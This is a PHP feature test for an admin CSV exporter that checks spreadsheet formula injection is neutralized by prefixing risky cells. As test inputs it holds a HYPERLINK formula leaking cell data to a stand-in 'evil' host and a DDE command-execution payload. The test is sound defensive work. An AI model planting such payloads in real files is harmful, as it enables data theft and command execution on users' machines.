<?php

namespace Tests\Feature\Admin;

use App\Filament\Support\ExportCsv;
use Tests\TestCase;

/**
 * Admin CSV exports must neutralize spreadsheet formula injection (CWE-1236):
 * user-controlled free text (full_name, ticket subject, review comment, plate)
 * flows into these files, so a cell starting with = + - @ must be forced to
 * literal text rather than evaluated by Excel/LibreOffice/Sheets.
 * (auth/export-hunt 2026-08-17)
 */
class ExportCsvFormulaInjectionTest extends TestCase
{
    private function neutralize(string $value): string
    {
        $m = new \ReflectionMethod(ExportCsv::class, 'neutralizeFormula');
        $m->setAccessible(true);

        return $m->invoke(null, $value);
    }

    public function test_formula_leading_cells_are_prefixed(): void
    {
        $this->assertSame('\'=HYPERLINK("http://evil/?"&C2,"x")', $this->neutralize('=HYPERLINK("http://evil/?"&C2,"x")'));
        $this->assertSame("'@SUM(A1:A9)", $this->neutralize('@SUM(A1:A9)'));
        $this->assertSame("'+cmd|' /C calc'!A0", $this->neutralize("+cmd|' /C calc'!A0"));
        $this->assertSame("'-1+1", $this->neutralize('-1+1'));
    }

    public function test_benign_and_numeric_cells_are_untouched(): void
    {
        $this->assertSame('Juan dela Cruz', $this->neutralize('Juan dela Cruz'));
        $this->assertSame('', $this->neutralize(''));
        // Real numbers (incl. negative wallet balances) stay summable, not text.
        $this->assertSame('-50.00', $this->neutralize('-50.00'));
        $this->assertSame('1234', $this->neutralize('1234'));
    }
}
